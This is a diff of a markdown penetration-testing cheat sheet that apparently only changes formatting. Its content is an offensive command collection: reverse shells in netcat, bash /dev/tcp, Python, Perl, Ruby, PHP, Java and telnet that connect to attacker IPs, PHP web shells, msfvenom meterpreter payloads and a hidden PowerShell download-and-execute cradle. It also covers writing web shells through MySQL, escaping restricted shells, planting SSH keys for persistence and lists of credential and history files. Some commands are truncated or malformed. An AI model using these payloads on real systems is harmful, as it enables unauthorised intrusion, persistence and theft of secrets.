@@ -6,38 +6,50 @@
 
 
 -  with the -e option
-
 ```
-- nc -e /bin/sh 10.0.0.1 1234
+nc -e /bin/sh 10.0.0.1 1234
 ```
 -  without -e option (If you have the wrong version of netcat installed)
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.245 443 >/tmp/f
 ```
-- Also read this:
 
 -  If the -e option is disabled, try this
 
 ```
--  mknod backpipe p && nc 10.11.0.245 443 0<backpipe | /bin/bash 1>backpipe /bin/sh | nc 10.11.0.245 443
--  rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4443 0/tmp/
+mknod backpipe p && nc 10.11.0.245 443 0<backpipe | /bin/bash 1>backpipe /bin/sh | nc 10.11.0.245 443
+
+rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4443 0/tmp/
 ```
+
 ## PHP
 
 ### PHP Shell
 - We can create a new file say ( shell.php ) on the server containing
+```
                    <?php system($\_GET["cmd"]); ?>
-- or
-                - which can be accessed by
-                   - http://IP/shell.php?cmd=id
-                - If there’s a webpage which accepts phpcode to be executed, we can use curl to urlencode the payload and run it.
-                   curl -G -s http://10.X.X.X/somepage.php?data= --data-urlencode "html=<?php passthru('ls -lah'); ?>" -b "somecookie=somevalue" | sed '/<html>/,/<\/html>/d'
+```
 
+which can be accessed by
+```
+                   - http://IP/shell.php?cmd=id
+```
+If there’s a webpage which accepts phpcode to be executed, we can use curl to urlencode the payload and run it.
+```
+ curl -G -s http://10.X.X.X/somepage.php?data= --data-urlencode "html=<?php passthru('ls -lah'); ?>" -b "somecookie=somevalue" | sed '/<html>/,/<\/html>/d'
+```
+
+```
 -G When used, this option will make all data specified with -d, --data, --data-binary or --data-urlencode to be used in an HTTP GET request instead of the POST request that otherwise would be used. The data will be appended to the URL with a  '?' separator.
+
 -data-urlencode <data> (HTTP) This posts data, similar to the other -d, --data options with the exception that this performs URL-encoding.
+
 -b, --cookie <data> (HTTP) Pass the data to the HTTP server in the Cookie header. It is supposedly the data previously received from the server in a "Set-Cookie:" line.  The data should be in the format "NAME1=VALUE1; NAME2=VALUE2".
-                - If you also want to provide upload functionality (Imagine, if we need to upload nc64.exe on Windows or other-binaries on linux), we can put the below code in the php file
-                   <?php
+```
+- If you also want to provide upload functionality (Imagine, if we need to upload nc64.exe on Windows or other-binaries on linux), we can put the below code in the php file
+
+```
+<?php
  if (isset($_REQUEST['fupload'])) {
   file_put_contents($_REQUEST['fupload'], file_get_contents("http://yourIP/" . $_REQUEST['fupload']));
  };
@@ -45,61 +57,83 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.245 443 >/tmp/f
   echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
  }
 ?>
+```
 ### * **PHP Meterpreter**
-                - We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.
+- We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.
+```
                    - msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php
+                   ```
 ### * **PHP Reverse Shell**
                 - TIP:   This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6
+                ```
                    - php -r '$sock=fsockopen("192.168.56.101",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
                 - The above can be connected by listening at port 1337 by using nc
-### aWeevely
+                ```
+### Weevely
+
+```
             - Weevely also generates a webshell
                - weevely generate password /tmp/payload.php
             - which can be called by
                - weevely http://192.168.1.2/location_of_payload password
             - However, it wasn't as useful as php meterpreter or reverse shell.
+            ```
 ### Ruby
+```
             - Code:
                - ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+               ```
 ### Perl
-            -
+```
                - perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
 ### Python
-            -
+```
                - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
 ### Java
-            -
+```
                r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
+```
 ### JSP
-            -
+```
                - msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f war > runme.war
+```
 ### Bash /dev/tcp
-            - If a server is listening on a port:
+
+- If a server is listening on a port:
+            ```
                - nc -lvp port
-### then we can use the below to connect
+               ```
+-  then we can use the below to connect
+```
                 - Method 1:
                    - /bin/bash -i >&/dev/tcp/10.11.0.245/443 0>&1
                 - Method 2:
                    - exec 5<>/dev/tcp/IP/80
+                   ```
+                   ```
 - cat <&5 | while read line; do $line 2>&5 >&5; done
                 - # or:
                    - while read line 0<&5; do $line 2>&5 >&5; done
                 - Method 3:
                    0<&196;exec 196<>/dev/tcp/IP/Port; sh <&196 >&196 2>&196
-
+```
 -- We may execute the above using bash -c "Aboveline "
 ### ## Information about Bash Built-in /dev/tcp File (TCP/IP) - CHECK DIT KOMENDE, een CHILD VAN hierboven is
                     - http://www.linuxjournal.com/content/more-using-bashs-built-devtcp-file-tcpip
 ### ## The following script fetches the front page from Google:
+```
                    exec 3<>/dev/tcp/www.google.com/80
 echo -e "GET / HTTP/1.1\r\nhost: http://www.google.com\r\nConnection: close\r\n\r\n" >&3
 cat <&3
-    ### ## The first line causes file descriptor 3 to be opened for reading and writing on the specified TCP/IP socket. This is a special form of the exec statement. From the bash man page:
+```
+The first line causes file descriptor 3 to be opened for reading and writing on the specified TCP/IP socket. This is a special form of the exec statement. From the bash man page:
                        - exec [-cl] [-a name] [command [arguments]]
                         - If command is not specified, any redirections take effect in the current shell, and the return status is 0. So using exec without a command is a way to open files in the current shell.
-    ### ## Second line: After the socket is open we send our HTTP request out the socket with the echo … >&3 command. The request consists of:
+Second line: After the socket is open we send our HTTP request out the socket with the echo … >&3 command. The request consists of:
                        GET / HTTP/1.1
 host: http://www.google.com
 Connection: close
@@ -107,8 +141,10 @@ Connection: close
                     - Third line: Next we read the response out of the socket using cat <&3, which reads the response and prints it out.
 ### Telnet Reverse Shell
            If netcat is not available or /dev/tcp
+           ```
             - Code:
                rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
+               ```
 
 telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
 ### XTerm
@@ -123,35 +159,44 @@ telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
             - When you start up a lynx client session, you can hit "g" (for Goto) and then enter the following URL:
                - URL to open: LYNXDOWNLOAD://Method=-1/File=/dev/null;/bin/sh;/SugFile=/dev/null
 ### MYSQL
-            - * If we have MYSQL Shell via sqlmap or phpmyadmin, we can use mysql outfile/ dumpfile function to upload a shell.
-               echo -n "<?php phpinfo(); ?>" | xxd -ps 3c3f70687020706870696e666f28293b203f3e
+  -  If we have MYSQL Shell via sqlmap or phpmyadmin, we can use mysql outfile/ dumpfile function to upload a shell.
+```
+echo -n "<?php phpinfo(); ?>" | xxd -ps 3c3f70687020706870696e666f28293b203f3e
 select 0x3c3f70687020706870696e666f28293b203f3e into outfile "/var/www/html/blogblog/wp-content/uploads/phpinfo.php"
-            - or
-               - SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php';
-            - * If you have sql-shell from sqlmap/ phpmyadmin, we can use
+```
+ or
+```
+ - SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php';
+```
+ If you have sql-shell from sqlmap/ phpmyadmin, we can use
+ ```
                - select load_file('/etc/passwd');
-### Reverse Shell from Windows
-### If there’s a way, we can execute code from windows, we may try
+```
+
+
+# Reverse Shell from Windows
+##### If there’s a way, we can execute code from windows, we may try
                 - Powershell Empire/ Metasploit Web-Delivery Method
-### ## Invoke-Shellcode (from powersploit)
+###  Invoke-Shellcode (from powersploit)
                     - Code:
                        Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://YourIPAddress:8000/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost YourIPAddress -Lport 4444 -Force"
-                - Upload ncat and execute
+## - Upload ncat and execute
 ### with nc:
-### Window reverse shell
+### Windows reverse shell
                     - c:>nc -Lp 31337 -vv -e cmd.exe nc 192.168.0.10 31337
                     - c:>nc example.com 80 -e cmd.exe nc -lp 80
                     - nc -lp 31337 -e /bin/bash
                     - nc 192.168.0.10 31337
                     - nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000
 ### MSF Meterpreter ELF
-            -
+
                - msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o met LHOST=10.10.XX.110 LPORT=4446
-### Metasploit MSFVenom
-            -
-            -
-### Ever wondered from where the above shells came from? Maybe try msfvenom and grep for cmd/unix
+## Metasploit MSFVenom
+
+##### Ever wondered from where the above shells came from? Maybe try msfvenom and grep for cmd/unix
                msfvenom -l payloads | grep "cmd/unix"
+
+```               
 **snip**
    cmd/unix/bind_awk                                   Listen for a connection and spawn a command shell via GNU AWK
    cmd/unix/bind_inetd                                 Listen for a connection and spawn a command shell (persistent)
@@ -166,10 +211,16 @@ select 0x3c3f70687020706870696e666f28293b203f3e into outfile "/var/www/html/blog
    cmd/unix/reverse_r                                  Connect back and create a command shell via R
    cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby
 **snip**
-                - Now, try to check the payload
+```
+- Now, try to check the payload
+```
                    msfvenom -p cmd/unix/bind_netcat
-Payload size: 105 bytes
-mkfifo /tmp/cdniov; (nc -l -p 4444 ||nc -l 4444)0</tmp/cdniov | /bin/sh >/tmp/cdniov 2>&1; rm /tmp/cdniov
+
+                          Payload size: 105 bytes
+
+                          mkfifo /tmp/cdniov; (nc -l -p 4444 ||nc -l 4444)0</tmp/cdniov | /bin/sh >/tmp/cdniov 2>&1; rm /tmp/cdniov
+                   ```
+
 
 ### MSF Linux Reverse Meterpreter Binary
                 - msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 --platform linux -o shell
@@ -194,28 +245,21 @@ http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html
         - About:
            Once we have reverse shell, we need a full TTY session by using either Python, sh, perl, ruby, lua, IRB. Spawning a TTY Shell and Post-Exploitation Without A TTY has provided multiple ways to get a tty shell
 ### Python
-            -
                python -c 'import pty; pty.spawn("/bin/sh")'
             - or
                ls
             - or
                - python -c 'import os; os.system("/bin/bash")'
 ### sh
-            -
                - /bin/sh -i
 ### Perl
-            -
                perl -e 'exec "/bin/sh";'
 or
 - perl: exec "/bin/sh";
 ### Ruby
-            - ^^^^
             - .. code-block :: bash
             - ruby: exec "/bin/sh"
-            -
 ### Lua
-            -
-            - ^^^
             - .. code-block :: bash
             - lua: os.execute('/bin/sh')
 ### IRB
@@ -257,7 +301,7 @@ interact
             - The su command would work from a terminal, however, would not take in raw stuff via the shell's Standard Input.
             - We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell
                (sleep 1; echo password) | python -c "import pty; pty.spawn(['/bin/su','-c','whoami']);"
-root
+                root
             - The above has been referenced from SANS `Sneaky Stealthy SU in (Web) Shells <https://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells#>`_
 
 
@@ -280,9 +324,11 @@ root
                 - Download the correct binary architecture of socat to a writable directory, chmod it, execute
 ### stty
             - Use the methods mentioned in Spawning a TTY Shell
-### Once bash is running in the PTY, background the shell with Ctrl-Z While the shell is in the background, examine the current terminal and STTY info so we can force the connected shell to match it
-                - like this:
-                   echo $TERM
+##### Once bash is running in the PTY, background the shell with Ctrl-Z While the shell is in the background, examine the current terminal and STTY info so we can force the connected shell to match it
+like this:
+
+```
+echo $TERM
 xterm-256color
 stty -a
 speed 38400 baud; rows 59; columns 264; line = 0;
@@ -291,24 +337,29 @@ intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <un
 -ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
 opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
 isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
-            - The information needed is the TERM type (“xterm-256color”) and the size of the current TTY (“rows 38; columns 116”)
-            - With the shell still backgrounded, set the current STTY to type raw and tell it to echo the input characters with the following command:
-               - stty raw -echo
-            - With a raw stty, input/output will look weird and you won’t see the next commands, but as you type they are being processed.
-            - Next foreground the shell with fg. It will re-open the reverse shell but formatting will be off. Finally, reinitialize the terminal with reset.
-            - After the reset the shell should look normal again. The last step is to set the shell, terminal type and stty size to match our current Kali window (from the info gathered above)
-               $ export SHELL=bash
+- The information needed is the TERM type (“xterm-256color”) and the size of the current TTY (“rows 38; columns 116”)
+- With the shell still backgrounded, set the current STTY to type raw and tell it to echo the input characters with the following command:
+- stty raw -echo
+- With a raw stty, input/output will look weird and you won’t see the next commands, but as you type they are being processed.
+- Next foreground the shell with fg. It will re-open the reverse shell but formatting will be off. Finally, reinitialize the terminal with reset.
+- After the reset the shell should look normal again. The last step is to set the shell, terminal type and stty size to match our current Kali window (from the info gathered above)
+$ export SHELL=bash
 $ export TERM=xterm256-color
 $ stty rows 38 columns 116
-            - The end result is a fully interactive TTY with all the features we’d expect (tab-complete, history, job control, etc) all over a netcat connection
-
+- The end result is a fully interactive TTY with all the features we’d expect (tab-complete, history, job control, etc) all over a netcat connection
+```
 
 
 
 ## ssh-key
-### If we have some user shell or access, probably it would be a good idea to generate a new ssh private-public key pair using ssh-keygen
-                - Code:
-                   ssh-keygen
+##### If we have some user shell or access, probably it would be a good idea to generate a new ssh private-public key pair using ssh-keygen
+Code:
+
+```
+ssh-keygen
+```
+
+```
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/bitvijays/.ssh/id_rsa):
 Enter passphrase (empty for no passphrase):
@@ -329,15 +380,20 @@ The key's randomart image is:
 | ..    . . . o . |
 |  ..      ooo o  |
 +----[SHA256]-----+
-            - Copy/ Append the public part to /home/user/.ssh/authorized_keys
-               cat /home/bitvijays/.ssh/id_rsa.pub
+```
+Copy/ Append the public part to /home/user/.ssh/authorized_keys
+```
+cat /home/bitvijays/.ssh/id_rsa.pub
+```
 
+```
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+tbCpnhU5qQm6typWI52FCin6NDYP0hmQFfag2kDwMDIS0j1ke/kuxfqfQKlbva9eo6IUaCrjIuAqbsZTsVjyFfjzo/hDKycR1M5/115Jx4q4v48a7BNnuUqi +qzUFjldFzfuTp6XM1n+Y1B6tQJJc9WruOFUNK2EX6pmOIkJ8QPTvMXYaxwol84MRb89V9vHCbfDrbWFhoA6hzeQVtI01ThMpQQqGv5LS+rI0GVlZnT8cUye0uiGZW7ek9DdcTEDtMUv1Y99zivk4FJmQWLzxplP5dUJ1NH5rm6YBH8CoQHLextWc36Ih18xsyzW8qK4Bfl4sOtESHT5/3PlkQHN bitvijays@Kali-Home" >> /home/user/.ssh/authorized_keys
-            - Now, ssh to the box using that user.
-               - ssh user@hostname -i id_rsa
+```
+Now, ssh to the box using that user.
 
-
-
+```
+- ssh user@hostname -i id_rsa
+```
 
 
 
@@ -378,15 +434,17 @@ bash: cd: restricted
                     - If ‘/’ is allowed in commands just run /bin/sh
                     - If we can set PATH or SHELL variable
                        export PATH=/bin:/usr/bin:/sbin:$PATH
-export SHELL=/bin/sh
+                    - export SHELL=/bin/sh
                     - or if chsh command is present just change the shell to /bin/bash
                        chsh
-password: <password will be asked>
-/bin/bash
+                    - password: <password will be asked>
+                    - /bin/bash
                     - If we can copy files into existing PATH, copy
                        cp /bin/sh /current/directory; sh
 #### Taking help of binaries
 #### ## Some commands let us execute other system commands, often bypassing shell restrictions
+```
+
                     - ftp -> !/bin/sh
                     - gdb -> !/bin/sh
                     - more/ less/ man -> !/bin/sh
@@ -396,88 +454,132 @@ password: <password will be asked>
                     - find / -name someName -exec /bin/sh ;
                     - tee
                        - echo "Your evil code" | tee script.sh
-    ### ## Invoke shell thru scripting language
-                        - Python
+   ```
+
+###  Invoke shell thru scripting language
+
+```
+- Python
                            - python -c 'import os; os.system("/bin/bash")
-                        - Perl
+- Perl
                            - perl -e 'exec "/bin/sh";'
+                           ```
+
 #### SSHing from outside
-                - Use SSH on your machine to execute commands before the remote shell is loaded:
-                   - ssh username@IP -t "/bin/sh"
-                - Start the remote shell without loading “rc” profile (where most of the limitations are often configured)
-                   - ssh username@IP -t "bash --noprofile"
+
+Use SSH on your machine to execute commands before the remote shell is loaded:
+```
+- ssh username@IP -t "/bin/sh"
+                   ```
+Start the remote shell without loading “rc” profile (where most of the limitations are often configured)
+```
+ - ssh username@IP -t "bash --noprofile"
+                   ```
+
 #### Getting out of rvim
+```
+
                 - Main difference of rvim vs vim is that rvim does not allow escape to shell with previously described techniques and, on top of that, no shell commands at all. Taken from vimjail
+                ```
+
 ####  To list all installed features it is possible to use ‘:version’ vim command:
+```
+
                     - Code:
                        :version
-VIM - Vi IMproved 8.0 (2016 Sep 12, compiled Nov 04 2017 04:17:46)
-Included patches: 1-1257
-Modified by pkg-vim-maintainers@lists.alioth.debian.org
-Compiled by pkg-vim-maintainers@lists.alioth.debian.org
-Huge version with GTK2 GUI.  Features included (+) or not (-):
-+acl             +cindent         +cryptv          -ebcdic          +float           +job             +listcmds        +mouse_dec       +multi_byte      +persistent_undo  +rightleft       +syntax          +termresponse    +visual          +X11
-+arabic          +clientserver    +cscope          +emacs_tags      +folding         +jumplist        +localmap        +mouse_gpm       +multi_lang      +postscript       +ruby            +tag_binary      +textobjects     +visualextra     -xfontset
-+autocmd         +clipboard       +cursorbind      +eval            -footer          +keymap          +lua             -mouse_jsbterm   -mzscheme        +printer          +scrollbind      +tag_old_static  +timers          +viminfo         +xim
-+balloon_eval    +cmdline_compl   +cursorshape     +ex_extra        +fork()          +lambda          +menu            +mouse_netterm   +netbeans_intg   +profile          +signs           -tag_any_white   +title           +vreplace        +xpm
-+browse          +cmdline_hist    +dialog_con_gui  +extra_search    +gettext         +langmap         +mksession       +mouse_sgr       +num64           -python           +smartindent     +tcl             +toolbar         +wildignore      +xsmp_interact
-++builtin_terms  +cmdline_info    +diff            +farsi           -hangul_input    +libcall         +modify_fname    -mouse_sysmouse  +packages        +python3          +startuptime     +termguicolors   +user_commands   +wildmenu        +xterm_clipboard
-+byte_offset     +comments        +digraphs        +file_in_path    +iconv           +linebreak       +mouse           +mouse_urxvt     +path_extra      +quickfix         +statusline      +terminal        +vertsplit       +windows         -xterm_save
-+channel         +conceal         +dnd             +find_in_path    +insert_expand   +lispindent      +mouseshape      +mouse_xterm     +perl            +reltime         - sun_workshop    +terminfo        +virtualedit     +writebackup
-  system vimrc file: "$VIM/vimrc
-                - Examining installed features and figure out which interpreter is installed.
-                - If python/ python3 has been installed
-                   - :python3 import pty;pty.spawn("/bin/bash")
+
+                       ```
+
+Examining installed features and figure out which interpreter is installed.
+
+If python/ python3 has been installed
+```
+ :python3 import pty;pty.spawn("/bin/bash")
+```
+
 ### Article:
-                - http://securebean.blogspot.nl/2014/05/escaping-restricted-shell_3.html
+``` http://securebean.blogspot.nl/2014/05/escaping-restricted-shell_3.html
+```
 ##Gather information from files
 ###In case of LFI or unprivileged shell, gathering information could be very useful.
-            - ** Mostly taken from `g0tmi1k Linux Privilege Escalation Blog <https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>`_
+```
+
+** Mostly taken from `g0tmi1k Linux Privilege Escalation Blog <https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>`_
+```
+
 ### Operating System
-            - Code:
-               cat /etc/issue
+Code:
+```
+cat /etc/issue
 cat /etc/*-release
 cat /etc/lsb-release         # Debian based
 cat /etc/redhat-release    # Redhat based
+```
 #### /Proc Variables
-            - Code:
-               /proc/sched_debug      This is usually enabled on newer systems, such as RHEL 6.  It provides information as to what process is running on which cpu.  This can be handy to get a list of processes and their PID number.
-/proc/mounts           Provides a list of mounted file systems.  Can be used to determine where other interesting files might be located
-/proc/net/arp          Shows the ARP table.  This is one way to find out IP addresses for other internal servers.
-/proc/net/route        Shows the routing table information.
-/proc/net/tcp
-/proc/net/udp          Provides a list of active connections.  Can be used to determine what ports are listening on the server
-/proc/net/fib_trie     This is used for route caching.  This can also be used to determine local IPs, as well as gain a better understanding of the target's networking structure
-/proc/version          Shows the kernel version.  This can be used to help determine the OS running and the last time it's been fully updated.
+
+Code:
+
+```
+- /proc/sched_debug      This is usually enabled on newer systems, such as RHEL 6.  It provides information as to what process is running on which cpu.  This can be handy to get a list of processes and their PID number.
+
+- /proc/net/arp          Shows the ARP table.  This is one way to find out IP addresses for other internal servers.
+
+- /proc/net/route        Shows the routing table information.
+
+- /proc/net/tcp
+
+- /proc/net/udp          Provides a list of active connections.  Can be used to determine what ports are listening on the server
+
+- /proc/net/fib_trie     This is used for route caching.  This can also be used to determine local IPs, as well as gain a better understanding of the target's networking structure
+
+- /proc/version          Shows the kernel version.  This can be used to help determine the OS running and the last time it's been fully updated.
+
+
 ####  Each process also has its own set of attributes. If we have the PID number and access to that process, then we can obtain some useful information about it, such as its environmental variables and any command line options that were run. Sometimes these include passwords. Linux also has a special proc directory called self which can be used to query information about the current process without having to know it’s PID.
-                - /proc/[PID]/cmdline    Lists everything that was used to invoke the process. This sometimes contains useful paths to configuration files as well as usernames and passwords.
-                - /proc/[PID]/environ    Lists all the environment variables that were set when the process was invoked.  This also sometimes contains useful paths to configuration files as well as usernames and passwords.
-                - /proc/[PID]/cwd        Points to the current working directory of the process.  This may be useful if you don't know the absolute path to a configuration file.
-                - /proc/[PID]/fd/[#]     Provides access to the file descriptors being used.  In some cases this can be used to read files that are opened by a process.
+
+- /proc/[PID]/cmdline    Lists everything that was used to invoke the process. This sometimes contains useful paths to configuration files as well as usernames and passwords.
+
+- /proc/[PID]/environ    Lists all the environment variables that were set when the process was invoked.  This also sometimes contains useful paths to configuration files as well as usernames and passwords.
+
+- /proc/[PID]/cwd        Points to the current working directory of the process.  This may be useful if you don't know the absolute path to a configuration file.
+
+- /proc/[PID]/fd/[#]     Provides access to the file descriptors being used.  In some cases this can be used to read files that are opened by a process.
+```
+
 ####  The information about Proc variables has been taken from “Directory Traversal, File Inclusion, and The Proc File System”
-                - https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/
+```
+- https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/
+```
+
 ### Environment Variables
-            -
-               cat /etc/profile
+```
+cat /etc/profile
 cat /etc/bashrc
 cat ~/.bash_profile
 cat ~/.bashrc
 cat ~/.bash_logout
+```
 ### Configuration Files
-            - Apache Web Server : Helps in figuring out the DocumentRoot where does your webserver files are?
-               - /etc/apache2/apache2.conf
+- Apache Web Server : Helps in figuring out the DocumentRoot where does your webserver files are?
+```
+- /etc/apache2/apache2.conf
 - /etc/apache2/sites-enabled/000-default
+```
+
 ### User History
-            -
-               - ~/.bash_history
+```
+- ~/.bash_history
 - ~/.nano_history
 - ~/.atftp_history
 - ~/.mysql_history
 - ~/.php_history
 - ~/.viminfo
+```
+
 ### Private SSH Keys / SSH Configuration
-            -
-               - ~/.ssh/authorized_keys : specifies the SSH keys that can be used for logging into the user account
+```
+
+- ~/.ssh/authorized_keys : specifies the SSH keys that can be used for logging into the user account
 - ~/.ssh/identity.pub
 - ~/.ssh/identity
 - ~/.ssh/id_rsa.pub
@@ -486,5 +588,7 @@ cat ~/.bash_logout
 - ~/.ssh/id_dsa
 - /etc/ssh/ssh_config  : OpenSSH SSH client configuration files
 - /etc/ssh/sshd_config : OpenSSH SSH daemon configuration file
+
+```
+
 ## *References:
-        -
